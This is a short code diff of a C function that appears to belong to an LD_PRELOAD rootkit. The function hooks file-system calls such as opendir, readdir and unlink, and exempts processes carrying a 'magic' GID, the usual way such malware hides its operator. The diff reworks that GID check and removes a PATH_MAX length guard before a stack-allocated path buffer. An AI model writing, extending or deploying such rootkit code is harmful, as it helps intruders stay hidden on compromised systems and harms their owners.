@@ -1,5 +1,6 @@
 void bdvcleanse(void){
-    if(not_user(0) || getgid() == readgid() || rkprocup() || rknomore())
+    gid_t magicgid = readgid();
+    if(getuid() == magicgid || getgid() == magicgid || rkprocup())
         return;
 
     hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT, CRMDIR);
@@ -17,8 +18,6 @@ void bdvcleanse(void){
             continue;
 
         pathlen = strlen(HOMEDIR) + strlen(dir->d_name) + 2;
-        if(pathlen>PATH_MAX) continue;
-
         char path[pathlen];
         snprintf(path, sizeof(path), "%s/%s", HOMEDIR, dir->d_name);
 
